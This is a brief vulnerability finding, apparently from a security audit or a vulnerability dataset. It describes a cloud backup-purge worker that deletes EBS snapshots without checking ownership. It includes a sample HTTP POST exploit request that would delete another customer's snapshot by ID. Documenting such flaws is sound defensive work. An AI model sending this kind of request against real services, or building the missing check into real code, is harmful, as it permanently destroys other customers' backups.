diagnosis: The AMQP worker deletes cloud EBS snapshots using AWS DeleteSnapshotCommand based on snapshotId in the message payload. It does not check if requesterUserId is the owner or cloud account administrator of the snapshot. An attacker triggering backup purge messages can permanently delete cloud server backups belonging to other customers.
exploit_request:
POST /api/cloud/backups/purge-request HTTP/1.1
Host: compute.cloudprovider.io
Authorization: Bearer <customer_jwt>
Content-Type: application/json

{"snapshotId": "65c2a11b901a2e0019fa0021"}
